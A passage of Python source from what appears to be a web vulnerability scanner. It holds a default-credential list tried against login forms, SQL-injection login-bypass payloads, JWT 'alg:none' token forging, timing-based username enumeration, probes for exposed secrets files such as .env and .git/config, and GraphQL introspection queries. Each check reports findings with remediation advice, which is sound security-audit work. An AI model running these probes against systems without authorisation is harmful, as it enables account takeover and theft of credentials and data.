    ("root",          "password"),
    ("root",          "123456"),
    ("root",          ""),
    ("root",          "pass"),
    ("root",          "admin"),
    ("user",          "user"),
    ("user",          "password"),
    ("user",          "123456"),
    ("user",          "user123"),
    ("test",          "test"),
    ("test",          "password"),
    ("test",          "123456"),
    ("test",          "test123"),
    ("guest",         "guest"),
    ("guest",         "password"),
    ("guest",         ""),
    ("demo",          "demo"),
    ("demo",          "password"),
    ("demo",          ""),
    ("manager",       "manager"),
    ("manager",       "password"),
    ("manager",       "123456"),
    ("operator",      "operator"),
    ("operator",      "password"),
    ("service",       "service"),
    ("service",       "password"),
    ("support",       "support"),
    ("support",       "password"),
    ("tomcat",        "tomcat"),
    ("tomcat",        "s3cret"),
    ("tomcat",        "password"),
    ("jenkins",       "jenkins"),
    ("jenkins",       "password"),
    ("nagios",        "nagios"),
    ("nagios",        "nagiosadmin"),
    ("zabbix",        "zabbix"),
    ("zabbix",        "zabbix1"),
    ("grafana",       "admin"),
    ("postgres",      "postgres"),
    ("postgres",      "password"),
    ("mysql",         "mysql"),
    ("oracle",        "oracle"),
    ("sa",            ""),
    ("sa",            "sa"),
    ("sa",            "password"),
    ("default",       "default"),
    ("default",       "password"),
    ("cisco",         "cisco"),
    ("cisco",         "password"),
    ("ubnt",          "ubnt"),
    ("pi",            "raspberry"),
    ("pi",            "pi"),
    ("ubuntu",        "ubuntu"),
    ("vagrant",       "vagrant"),
    ("hadoop",        "hadoop"),
    ("elastic",       "changeme"),
    ("kibana",        "changeme"),
    ("ftp",           "ftp"),
    ("anonymous",     ""),
    ("anonymous",     "anonymous"),
    ("webmaster",     "webmaster"),
    ("webadmin",      "webadmin"),
    ("sysadmin",      "sysadmin"),
    ("deploy",        "deploy"),
    ("backup",        "backup"),
    ("wordpress",     "wordpress"),
    ("drupal",        "drupal"),
    ("joomla",        "joomla"),
    ("",              "admin"),
    ("",              "password"),
    ("",              ""),
    ("Admin",         "Admin"),
    ("Admin",         "admin"),
    ("Administrator", "administrator"),
    ("Administrator", "password"),
    ("admin1",        "admin1"),
    ("monitor",       "monitor"),
    ("super",         "super"),
    ("security",      "security"),
    ("netadmin",      "netadmin"),
    ("network",       "network"),
    ("login",         "password"),
    ("info",          "info"),
    ("config",        "config"),
    ("system",        "system"),
]

# ─────────────────────────────────────────────
# AuthProbe integration helpers
# ─────────────────────────────────────────────

def _find_authprobe_bin() -> "str | None":
    """Return path to authprobe.py, or None if not installed."""
    candidates = [
        "/opt/pr0t31n/AuthProbe/authprobe.py",
        str(Path(__file__).parent.parent / "AuthProbe" / "authprobe.py"),
    ]
    for c in candidates:
        if Path(c).exists():
            return c
    return shutil.which("authprobe")


def _run_authprobe_json(url: str, login_url: "str | None" = None,
                        username: "str | None" = None,
                        password: "str | None" = None,
                        ap_timeout: int = 30) -> "dict | None":
    """Run AuthProbe with --json and return parsed output, or None on failure."""
    authprobe = _find_authprobe_bin()
    if not authprobe:
        return None
    cmd = [sys.executable, authprobe, "--url", url, "--json", "--no-verify",
           "--timeout", str(ap_timeout)]
    if login_url:
        cmd += ["--login-url", login_url]
    if username is not None:
        cmd += ["--username", username]
    if password is not None:
        cmd += ["--password", password]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=ap_timeout + 30)
        return json.loads(r.stdout)
    except Exception:
        return None


def _probe_login_default_creds(login_url: str, target: dict,
                                out: "OutputManager") -> "dict | None":
    """
    Fingerprint a login page via AuthProbe (INFO findings for app type and auth
    method), then test every entry in _DEFAULT_CREDS.  Returns the first
    successful credential set as a dict, or None if none succeed.
    """
    phase = "auth_bypass"
    auth_out = out.output_path(phase, "authprobe_" + target["hostname"])

    vc.log(f"[auth_bypass] AuthProbe fingerprinting: {login_url}", "INFO")
    fp = _run_authprobe_json(login_url, ap_timeout=30)
    app_name    = ""
    auth_method = ""
    effective_login = login_url

    if fp:
        matches = fp.get("software_matches", [])
        if matches:
            app_name = matches[0].get("name", "")
        auth_method = fp.get("auth_info_mode", "")
        login_eps   = fp.get("login_endpoints", [])
        if login_eps:
            _ep_path = login_eps[0].get("path", "")
            if _ep_path:
                effective_login = (_ep_path if _ep_path.startswith("http")
                                   else target["url"].rstrip("/") + _ep_path)

        if app_name:
            out.add_finding(
                title="Application Identified at Login Page",
                url=login_url, port=target["port"], risk="INFO",
                description=(
                    f"AuthProbe identified the application as '{app_name}' "
                    f"at {login_url}."
                ),
                output=f"Application: {app_name}",
                sources="authprobe", service=target["scheme"],
                affected=login_url, output_file=str(auth_out),
                owasp="A05:2025 Security Misconfiguration",
                nist="SI-2",
                remediation=(
                    "Ensure software version information is not exposed "
                    "in login pages or HTTP headers."
                ),
            )
        if auth_method:
            out.add_finding(
                title="Authentication Method Identified",
                url=login_url, port=target["port"], risk="INFO",
                description=(
                    f"AuthProbe identified the authentication method as "
                    f"'{auth_method}' at {login_url}."
                ),
                output=f"Auth method: {auth_method}",
                sources="authprobe", service=target["scheme"],
                affected=login_url, output_file=str(auth_out),
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-2",
                remediation=(
                    "Ensure authentication is properly configured, hardened, "
                    "and not using default or weak credentials."
                ),
            )

    for uname, pwd in _DEFAULT_CREDS:
        _pwd_disp = repr(pwd) if pwd else "'(blank)'"
        vc.log(f"[auth_bypass] Testing default creds: {uname!r}/{_pwd_disp}", "INFO")
        result = _run_authprobe_json(login_url, login_url=effective_login,
                                     username=uname, password=pwd, ap_timeout=10)
        if not result:
            continue
        if any(v.get("success") for v in result.get("validation_results", [])):
            try:
                auth_out.write_text(
                    f"# Default Credentials Found\n"
                    f"URL: {login_url}\n"
                    f"Username: {uname}\nPassword: {pwd}\n"
                    f"Auth method: {auth_method}\n",
                    encoding="utf-8",
                )
            except Exception:
                pass
            out.add_finding(
                title="Weak or Default Credentials Accepted",
                url=login_url, port=target["port"], risk="CRITICAL",
                description="The target accepted well-known default or factory-set credentials, granting unauthorised access.",
                output=(
                    f"Username: {uname}\nPassword: {pwd}\n"
                    f"Auth method: {auth_method}"
                ),
                sources="authprobe", service=target["scheme"],
                affected=login_url, output_file=str(auth_out),
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Replace all default credentials with strong, unique secrets and enforce a password policy prior to any deployment.",
            )
            vc.log(f"[auth_bypass] Default creds accepted: {uname!r}/{pwd!r}",
                   "SUCCESS")
            return {"username": uname, "password": pwd,
                    "auth_method": auth_method, "login_url": login_url}

    return None


_SQLI_BYPASS_PAYLOADS = [
    ("admin'--",    "anything"),
    ("' OR 1=1--",  "anything"),
    ("' OR '1'='1", "anything"),
    ("admin' #",    "anything"),
]


def _phase_auth_bypass(target: dict, cfg: dict, pm: ProgressManager,
                       out: OutputManager, sess: requests.Session,
                       crawl_data: dict) -> list:
    phase      = "auth_bypass"
    url        = target["url"]
    timeout    = cfg.get("timeout", 10)
    forms      = crawl_data.get("forms", [])
    _discovered: list = []
    vc.status(phase, "Auth Bypass", "running", "Default credentials", 0, 4)

    # Shared evidence log for this phase — all findings reference this file
    auth_out = out.output_path(phase, "auth_bypass_" + target["hostname"])
    auth_out.write_text(
        f"# Auth Bypass Testing — {url}\n\n", encoding="utf-8"
    )

    # Find login forms
    login_forms = [f for f in forms if re.search(r'login|signin|auth', f.get("action", ""), re.I)
                   or any(i.get("type") == "password" for i in f.get("inputs", []))]

    for form in login_forms[:3]:
        action  = form.get("action", url)
        method  = form.get("method", "POST")
        inputs  = form.get("inputs", [])
        user_f  = next((i["name"] for i in inputs if re.search(r'user|email|login', i["name"], re.I)), None)
        pass_f  = next((i["name"] for i in inputs if i.get("type") == "password"), None)

        if not user_f or not pass_f:
            continue

        # 1. Default credentials via AuthProbe
        _form_url = (action if action.startswith("http")
                     else url.rstrip("/") + "/" + action.lstrip("/"))
        _dc = _probe_login_default_creds(_form_url, target, out)
        if _dc:
            _discovered.append(_dc)

        vc.status(phase, "Auth Bypass", "running", "SQLi login bypass", 1, 4)
        # 2. SQLi in login
        for usr_pay, pwd_pay in _SQLI_BYPASS_PAYLOADS:
            data = {i["name"]: "" for i in inputs if i.get("name")}
            data[user_f] = usr_pay
            data[pass_f] = pwd_pay
            try:
                r = sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                if r.status_code in (200, 302) and not re.search(r'login|invalid|incorrect|failed', r.text, re.I):
                    with auth_out.open("a", encoding="utf-8") as _af:
                        _af.write(
                            f"## SQLi Login Bypass\n"
                            f"URL: {action}\nPayload: {usr_pay}\n"
                            f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                        )
                    out.add_finding(
                        title="Authentication Bypass via SQL Injection",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=f"Login form at {action} is vulnerable to SQL injection authentication bypass.",
                        output=f"Payload: {usr_pay}\nResponse: {r.status_code}",
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=action, output_file=str(auth_out),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation="Use parameterised queries for login. Implement account lockout.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[auth_bypass] Login SQLi bypass at {action}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "Account enumeration", 2, 4)
    # 3. Account enumeration via password reset
    reset_paths = ["/forgot-password", "/reset-password", "/account/recover",
                   "/password-reset", "/auth/forgot"]
    for rpath in reset_paths:
        try:
            r = sess.get(url + rpath, timeout=timeout)
            if r.status_code == 200:
                # Check if responses differ for valid vs invalid users
                vc.log(f"[auth_bypass] Password reset endpoint found: {rpath}", "INFO")
                with auth_out.open("a", encoding="utf-8") as _af:
                    _af.write(
                        f"## Password Reset Endpoint\n"
                        f"Path: {rpath}\nResponse: {r.status_code}\n{r.text[:2000]}\n\n"
                    )
                out.add_finding(
                    title="Password Reset Endpoint Exposed",
                    url=url + rpath, port=target["port"], risk="INFO",
                    description=f"Password reset endpoint found at {rpath}. Test for account enumeration by submitting valid/invalid usernames.",
                    output=f"GET {rpath} → {r.status_code}",
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=url + rpath, output_file=str(auth_out),
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation="Ensure password reset returns a consistent message regardless of whether the email exists.",
                    http_code=r.status_code,
                )
                break
        except Exception:
            pass

    vc.status(phase, "Auth Bypass", "running", "JWT none algorithm", 3, 4)
    # 4. JWT none algorithm check — look for JWT in cookies/headers
    for cookie in sess.cookies:
        val = cookie.value or ""
        if re.match(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.', val):
            try:
                import base64 as _b64
                parts = val.split(".")
                padded = parts[0] + "=" * (-len(parts[0]) % 4)
                header = json.loads(_b64.urlsafe_b64decode(padded).decode("utf-8", errors="replace"))
                alg    = header.get("alg", "")
                if alg.lower() in ("hs256", "rs256"):
                    # Construct 'none' algorithm token
                    none_header = _b64.urlsafe_b64encode(
                        json.dumps({"alg": "none", "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    none_token = f"{none_header}.{parts[1]}."
                    test_sess = _make_session(cfg)
                    test_sess.cookies.set(cookie.name, none_token)
                    r = test_sess.get(url, timeout=timeout)
                    if r.status_code == 200:
                        with auth_out.open("a", encoding="utf-8") as _af:
                            _af.write(
                                f"## JWT None Algorithm Bypass\n"
                                f"Cookie: {cookie.name}\nToken: {none_token[:80]}\n"
                                f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                            )
                        out.add_finding(
                            title="JWT None Algorithm Authentication Bypass",
                            url=url, port=target["port"], risk="CRITICAL",
                            description="The application accepts JSON Web Tokens specifying the alg:none algorithm, allowing an attacker to forge arbitrary tokens without possessing a signing key and bypass authentication entirely.",
                            output=f"Cookie: {cookie.name}\nToken: {none_token[:80]}",
                            sources="fracture-auth-bypass", service=target["scheme"],
                            output_file=str(auth_out),
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="IA-5",
                            remediation="Enforce a strict server-side algorithm allowlist; reject any token where the alg header is none, empty, or not in the permitted set; never rely on the token header to select the verification algorithm.",
                            http_code=r.status_code,
                        )
                        vc.log("[auth_bypass] JWT none algorithm accepted!", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "JWT claim inspection", 4, 7)
    # 5. JWT Missing Expiry claim
    for cookie in sess.cookies:
        val = cookie.value or ""
        if re.match(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.', val):
            try:
                import base64 as _b64j
                parts = val.split(".")
                payload_padded = parts[1] + "=" * (-len(parts[1]) % 4)
                jwt_payload = json.loads(_b64j.urlsafe_b64decode(payload_padded).decode("utf-8", errors="replace"))
                if "exp" not in jwt_payload:
                    out.add_finding(
                        title="JWT — Missing Expiry Claim (No exp)",
                        url=url, port=target["port"], risk="MEDIUM",
                        description=(f"The JWT in cookie '{cookie.name}' has no 'exp' claim. "
                                     f"Without an expiry, the token is valid indefinitely and cannot "
                                     f"be invalidated server-side after issuance."),
                        output=f"Cookie: {cookie.name}\nJWT payload: {json.dumps(jwt_payload)[:300]}",
                        sources="fracture-auth-bypass", service=target["scheme"],
                        output_file=str(auth_out),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation="Always include an 'exp' claim in JWTs. Set a short expiry (≤15 minutes for sensitive operations).",
                    )
                    vc.log(f"[auth_bypass] JWT missing exp: {cookie.name}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "Credentials in URL", 5, 7)
    # 6. Credentials transmitted in URL query parameters
    _cred_param_re = re.compile(
        r'[?&](password|passwd|pwd|secret|token|api_key|apikey|auth|access_token)'
        r'=([^&\s]{4,})', re.I
    )
    for link in crawl_data.get("links", []):
        if _cred_param_re.search(link):
            m = _cred_param_re.search(link)
            out.add_finding(
                title="Credentials Transmitted in URL Query Parameters",
                url=link, port=target["port"], risk="HIGH",
                description=(f"Sensitive credential parameter '{m.group(1)}' found in URL query string. "
                             f"URLs containing credentials are logged by proxies, referrer headers, "
                             f"and browser history, exposing them to unintended disclosure."),
                output=f"URL: {link}\nParameter: {m.group(1)}",
                sources="fracture-auth-bypass", service=target["scheme"],
                affected=link,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Transmit credentials only in request body or headers, never in URL query parameters.",
            )
            vc.log(f"[auth_bypass] Credentials in URL: {link[:80]}", "SUCCESS")

    vc.status(phase, "Auth Bypass", "running", "Timing attack probe", 6, 7)
    # 7. Timing attack — non-constant-time comparison on login
    import time as _time_ab
    _timing_login_paths = ["/login", "/auth/login", "/api/login", "/signin", "/auth/token"]
    for lpath in _timing_login_paths:
        try:
            login_u = url + lpath
            times_invalid = []
            times_valid_fmt = []
            _timing_resp_invalid = None
            _timing_resp_valid   = None
            # Probe with clearly invalid usernames vs. valid-format usernames
            for _ in range(5):
                t0 = _time_ab.monotonic()
                _timing_resp_invalid = sess.post(login_u, json={"username": "zzznouserzzzz", "password": "wrong"}, timeout=timeout)
                times_invalid.append(_time_ab.monotonic() - t0)
            for _ in range(5):
                t0 = _time_ab.monotonic()
                _timing_resp_valid = sess.post(login_u, json={"username": "admin", "password": "wrong_password_xyz"}, timeout=timeout)
                times_valid_fmt.append(_time_ab.monotonic() - t0)
            if times_invalid and times_valid_fmt:
                avg_invalid = sum(times_invalid) / len(times_invalid)
                avg_valid   = sum(times_valid_fmt) / len(times_valid_fmt)
                # If valid-format username is consistently >150ms slower, timing oracle likely
                if avg_valid - avg_invalid > 0.15:
                    _timing_evidence: list = []
                    _timing_http_code = 0
                    try:
                        if _timing_resp_invalid is not None:
                            _rq, _rp = _save_http_evidence(
                                out, phase, "timing_invalid_user",
                                _timing_resp_invalid, endpoint_url=login_u, method="POST")
                            _timing_evidence.extend([_rq, _rp])
                        if _timing_resp_valid is not None:
                            _rq, _rp = _save_http_evidence(
                                out, phase, "timing_valid_fmt_user",
                                _timing_resp_valid, endpoint_url=login_u, method="POST")
                            _timing_evidence.extend([_rq, _rp])
                            _timing_http_code = _timing_resp_valid.status_code
                    except Exception:
                        pass
                    out.add_finding(
                        title="Timing Attack — Non-Constant-Time Authentication",
                        url=login_u, port=target["port"], risk="MEDIUM",
                        description=(f"Login endpoint {lpath} shows a {(avg_valid - avg_invalid)*1000:.0f}ms "
                                     f"average response time difference between invalid usernames and "
                                     f"valid-format usernames, suggesting non-constant-time comparison. "
                                     f"An attacker can use this timing oracle for username enumeration."),
                        output=(f"Avg time (invalid user): {avg_invalid*1000:.0f}ms\n"
                                f"Avg time (valid-format user): {avg_valid*1000:.0f}ms\n"
                                f"Delta: {(avg_valid-avg_invalid)*1000:.0f}ms\n"
                                f"HTTP status (valid-format probe): {_timing_http_code}"),
                        output_file=",".join(_timing_evidence) if _timing_evidence else None,
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=login_u,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        http_code=_timing_http_code,
                        remediation=(
                            "Use constant-time comparison functions for all credential checks. "
                            "Hash credentials before comparison and add artificial jitter to login response times."
                        ),
                    )
                    vc.log(f"[auth_bypass] Timing oracle at {lpath} ({(avg_valid-avg_invalid)*1000:.0f}ms delta)", "SUCCESS")
                    break
        except Exception:
            pass

    vc.status(phase, "Auth Bypass", "complete", "Done", 7, 7)
    vc.log("[auth_bypass] Phase complete", "SUCCESS")
    return _discovered


# ─────────────────────────────────────────────
# Phase 8: Sensitive Files
# ─────────────────────────────────────────────
_SENSITIVE_FILES: list = [
    # (path, risk, description)
    # Risk levels calibrated to OWASP WSTG OTG-CONFIG-004 and Tenable/Acunetix guidance.
    # CWE-312 (Cleartext Storage), CWE-530 (Exposure of Backup File), CWE-200 (Info Disclosure).

    # CRITICAL — direct credential or source code exposure providing immediate data-layer access
    ("/.git/HEAD",              "CRITICAL", "Git repository HEAD file exposed — full source code reconstruction possible via git partial clone. CWE-312."),
    ("/.git/config",            "CRITICAL", "Git repository config exposed — may reveal remote URLs with embedded credentials. CWE-312."),
    ("/.git/COMMIT_EDITMSG",    "CRITICAL", "Git repository commit message exposed — confirms version control access. CWE-312."),
    ("/.env",                   "CRITICAL", ".env environment file exposed — contains database credentials, API keys, and secrets. CWE-312, CWE-522."),
    ("/.env.local",             "CRITICAL", ".env.local environment file exposed — contains environment-specific secrets. CWE-312, CWE-522."),
    ("/.env.production",        "CRITICAL", ".env.production environment file exposed — production secrets and credentials. CWE-312, CWE-522."),
    ("/wp-config.php",          "CRITICAL", "WordPress config file exposed — contains database credentials and AUTH_KEYs. CWE-312, CWE-522."),
    ("/settings.py",            "CRITICAL", "Django/Python settings file exposed — contains SECRET_KEY, database passwords, and API keys. CWE-312, CWE-522."),
    ("/database.yml",           "CRITICAL", "Rails database config exposed — contains production database host, username, and password. CWE-312, CWE-522."),
    ("/db.sql",                 "CRITICAL", "SQL database dump exposed — complete database contents including users, hashes, and PII. CWE-312, CWE-530."),
    ("/dump.sql",               "CRITICAL", "SQL database dump exposed — complete database contents including users, hashes, and PII. CWE-312, CWE-530."),
    ("/site.tar.gz",            "CRITICAL", "Site archive exposed — full application source code with embedded credentials. CWE-530, CWE-312."),
    ("/backup.zip",             "CRITICAL", "Backup archive exposed — application source code and config files with credentials. CWE-530, CWE-312."),
    # web.config: CRITICAL — machineKey exposure enables ASP.NET ViewState RCE; connection strings expose DB creds. CWE-13.
    ("/web.config",             "CRITICAL", "IIS web.config exposed — may contain database connection strings, machineKey (enables ViewState RCE), and API keys. CWE-13, CWE-312."),

    # HIGH — credential hash exposure or significant reconnaissance enabling further exploitation
    ("/config.php",             "HIGH",     "PHP config file exposed — likely contains database credentials. CWE-312."),
    ("/configuration.php",      "HIGH",     "PHP configuration file exposed — may contain database credentials. CWE-312."),
    ("/index.php.bak",          "HIGH",     "PHP source backup exposed — unprocessed source code visible. CWE-530."),
    ("/index.php~",             "HIGH",     "PHP editor backup exposed — unprocessed source code visible. CWE-530."),
    # .htpasswd: HIGH — contains HTTP Basic Auth hashes (MD5crypt readily crackable). CWE-522.
    ("/.htpasswd",              "HIGH",     ".htpasswd file exposed — contains HTTP Basic Auth password hashes, subject to offline cracking. CWE-522, CWE-200."),

    # MEDIUM — configuration reconnaissance or indirect attack enablement
    ("/.htaccess",              "MEDIUM",   ".htaccess file exposed — reveals access control rules and rewrite logic. CWE-200."),
    ("/phpinfo.php",            "MEDIUM",   "PHP info page exposed — discloses PHP version, loaded modules, server paths, and environment variables. CWE-200."),
    ("/info.php",               "MEDIUM",   "PHP info page exposed — discloses PHP version, loaded modules, server paths, and environment variables. CWE-200."),
    ("/test.php",               "MEDIUM",   "PHP test page exposed — may disclose configuration or provide unintended functionality. CWE-200."),
    ("/server-status",          "MEDIUM",   "Apache server-status exposed — discloses active requests, client IPs, and internal paths. CWE-200."),
    ("/server-info",            "MEDIUM",   "Apache server-info exposed — discloses module configuration and directives. CWE-200."),
    ("/docker-compose.yml",     "MEDIUM",   "docker-compose.yml exposed — discloses service topology, image versions, and potentially hardcoded credentials. CWE-200."),

    # LOW — dependency or infrastructure metadata with reconnaissance value only
    ("/composer.json",          "LOW",      "composer.json exposed — discloses PHP dependency versions for targeted CVE research. CWE-200."),
    ("/package.json",           "LOW",      "package.json exposed — discloses Node.js dependency versions for targeted CVE research. CWE-200."),
    ("/requirements.txt",       "LOW",      "requirements.txt exposed — discloses Python dependency versions for targeted CVE research. CWE-200."),
    ("/crossdomain.xml",        "LOW",      "crossdomain.xml exposed — Flash/PDF cross-domain policy may permit unintended access. CWE-942."),
    ("/clientaccesspolicy.xml", "LOW",      "clientaccesspolicy.xml exposed — Silverlight cross-domain policy file. CWE-200."),
    ("/.DS_Store",              "LOW",      ".DS_Store file exposed — macOS metadata reveals directory structure. CWE-200."),
    ("/Dockerfile",             "LOW",      "Dockerfile exposed — discloses base image, build steps, and environment configuration. CWE-200."),
]


def _phase_files(target: dict, cfg: dict, pm: ProgressManager,
                 out: OutputManager, sess: requests.Session) -> None:
    phase      = "files"
    url        = target["url"]
    timeout    = cfg.get("timeout", 10)
    total      = len(_SENSITIVE_FILES)
    _base_path = urllib.parse.urlparse(url).path or "/"
    vc.status(phase, "Sensitive Files", "running", "Probing", 0, total)

    # Detect wildcard/catch-all before probing; skip files that match the baseline.
    _file_wc = _detect_wildcard(url, sess, timeout)
    if _file_wc is not None:
        vc.log("[files] Wildcard detected — all file findings will be validated against baseline",
               "INFO")

    for idx, (fpath, risk, fdesc) in enumerate(_SENSITIVE_FILES):
        vc.status(phase, "Sensitive Files", "running", fpath, idx, total)
        try:
            _fpath_full_url = url.rstrip("/") + fpath
            r = sess.get(_fpath_full_url, timeout=timeout, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 5:
                if _is_wildcard_match(r, _file_wc):
                    continue   # matches catch-all baseline — not a real file
                out_f = out.output_path(phase, "file_" + fpath.replace("/", "_").lstrip("_"))
                out_f.write_text(r.text[:10000], encoding="utf-8")
                out.add_finding(
                    title=f"Sensitive File Exposed: {fpath}",
                    url=_fpath_full_url, port=target["port"], risk=risk,
                    description=fdesc + f" ({_fpath_full_url} returned HTTP 200).",
                    output=r.text[:500], sources="fracture-files",
                    service=target["scheme"], output_file=str(out_f),
                    affected=_fpath_full_url,
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation=f"Remove or restrict access to {fpath}.",
                )
                try:
                    _write_structure_map(out, target,
                                         path_statuses={_base_path.rstrip("/") + fpath: r.status_code},
                                         source="files")
                except Exception:
                    pass
                vc.log(f"[files] Found: {fpath} (risk={risk})", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Sensitive Files", "complete", "Done", total, total)
    vc.log("[files] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 9: Vulnerability Scan
# ─────────────────────────────────────────────
_NUCLEI_SEVERITY_MAP = {"critical": "CRITICAL", "high": "HIGH",
                        "medium": "MEDIUM", "low": "LOW", "info": "INFO"}


def _phase_vulnscan(target: dict, cfg: dict, pm: ProgressManager,
                    out: OutputManager, sess: requests.Session,
                    fast: bool = False) -> None:
    phase   = "vulnscan"
    url     = target["url"]
    timeout = cfg.get("nuclei_timeout", 600)
    vc.status(phase, "Vuln Scan", "running", "nuclei", 0, 2)

    # 1. nuclei
    nuclei = _find_tool("nuclei")
    if nuclei and not fast:
        nuc_out = out.output_path(phase, "nuclei_" + target["hostname"])
        _nuc_templates_dir = "/opt/nuclei-templates"
        # Use -json (JSONL output to stdout); capture stdout directly so the
        # output file is always written even when nuclei finds nothing.
        # stderr is captured and logged so flag errors are visible.
        cmd = [nuclei, "-u", url, "-s", "critical,high,medium",
               "-silent", "-json", "-no-interactsh"]
        if Path(_nuc_templates_dir).is_dir():
            cmd += ["-t", _nuc_templates_dir]
        vc.log("[vulnscan] Running nuclei ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            _register_proc(proc)
            nuc_stdout, nuc_stderr = proc.communicate(timeout=timeout)
            _deregister_proc(proc)
            if nuc_stderr:
                # Strip ANSI escape sequences nuclei emits to a terminal
                _nuc_clean = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', nuc_stderr).strip()
                # Suppress known non-fatal startup noise (cloud provider key
                # loading, update checks) — these don't affect scan results.
                _NUC_NONFATAL = re.compile(
                    r'failed to load provider keys'
                    r'|update check'
                    r'|nuclei cloud'
                    r'|cannot unmarshal.*sources\.Provider',
                    re.I,
                )
                _nuc_warn = "\n".join(
                    ln for ln in _nuc_clean.splitlines()
                    if ln.strip() and not _NUC_NONFATAL.search(ln)
                )
                if _nuc_warn:
                    vc.log(f"[vulnscan] nuclei stderr: {_nuc_warn[:500]}", "WARNING")
            # Always write the output file (may be empty if no findings)
            nuc_out.write_text(nuc_stdout, encoding="utf-8")
            out.log_command("nuclei", cmd, nuc_out)
            for line in nuc_stdout.splitlines():
                try:
                    item    = json.loads(line)
                    sev     = _NUCLEI_SEVERITY_MAP.get(item.get("info", {}).get("severity", "info"), "INFO")
                    ntitle  = item.get("info", {}).get("name", "Nuclei Finding")
                    matched = item.get("matched-at", url)
                    desc    = item.get("info", {}).get("description", "")
                    cves    = ",".join(item.get("info", {}).get("classification", {}).get("cve-id", []))
                    out.add_finding(
                        title=f"Nuclei: {ntitle}",
                        url=matched, port=target["port"], risk=sev,
                        description=desc, sources="nuclei",
                        service=target["scheme"], output_file=str(nuc_out),
                        cves=cves, affected=matched,
                        owasp="A06:2025 Vulnerable and Outdated Components",
                        nist="SI-2",
                        remediation="Apply vendor patches and update affected components.",
                    )
                except Exception:
                    pass
        except Exception as e:
            out.log_error("nuclei", cmd, str(e))
    else:
        vc.log("[vulnscan] nuclei not found or fast mode — skipping", "WARNING")

    vc.status(phase, "Vuln Scan", "running", "nikto", 1, 2)
    # 2. nikto
    nikto = _find_tool("nikto")
    if nikto:
        nik_out = out.output_path(phase, "nikto_" + target["hostname"])
        cmd     = [nikto, "-h", url, "-Format", "json",
                   "-output", str(nik_out), "-nointeractive"]
        vc.log("[vulnscan] Running nikto ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=600)
            _deregister_proc(proc)
            out.log_command("nikto", cmd, nik_out)
            if nik_out.exists():
                try:
                    ndata = json.loads(nik_out.read_text(encoding="utf-8"))
                    for vuln in ndata.get("vulnerabilities", []):
                        out.add_finding(
                            title=f"Nikto: {vuln.get('id','Unknown')}",
                            url=url, port=target["port"], risk="MEDIUM",
                            description=vuln.get("msg", ""),
                            sources="nikto", service=target["scheme"],
                            output_file=str(nik_out),
                            owasp="A06:2025 Vulnerable and Outdated Components",
                            nist="SI-2",
                            remediation="Review and remediate the identified web server issue.",
                        )
                except Exception:
                    pass
        except Exception as e:
            out.log_error("nikto", cmd, str(e))
    else:
        vc.log("[vulnscan] nikto not found", "WARNING")

    vc.status(phase, "Vuln Scan", "complete", "Done", 2, 2)
    vc.log("[vulnscan] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 10: GraphQL
# ─────────────────────────────────────────────
_GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/graphql/v1",
                  "/query", "/gql", "/v1/graphql"]
_INTROSPECTION_QUERY = '{"query":"{__schema{types{name}}}"}'


def _phase_graphql(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, sess: requests.Session) -> None:
    phase   = "graphql"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "GraphQL", "running", "Endpoint detection", 0, 3)

    found_gql = None
    for gpath in _GRAPHQL_PATHS:
        try:
            r = sess.post(url + gpath,
                          data=_INTROSPECTION_QUERY,
                          headers={"Content-Type": "application/json"},
                          timeout=timeout)
            if r.status_code == 200 and "__schema" in r.text:
                found_gql = url + gpath
                vc.log(f"[graphql] GraphQL endpoint: {found_gql}", "SUCCESS")
                out.add_finding(
                    title="GraphQL Introspection Enabled",
                    url=found_gql, port=target["port"], risk="MEDIUM",
                    description=f"GraphQL introspection is enabled at {found_gql}. This allows attackers to enumerate the full API schema.",
                    output=r.text[:500], sources="fracture-graphql",
                    service=target["scheme"], affected=found_gql,
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation="Disable GraphQL introspection in production environments.",
                )
                break
            elif r.status_code == 200 and "data" in r.text:
                found_gql = url + gpath
                vc.log(f"[graphql] GraphQL endpoint (no introspection): {found_gql}", "INFO")
                break
        except Exception:
            pass

    if not found_gql:
        vc.log("[graphql] No GraphQL endpoint found", "INFO")
        vc.status(phase, "GraphQL", "complete", "No endpoint", 3, 3)
        return

    vc.status(phase, "GraphQL", "running", "Batch query test", 1, 3)
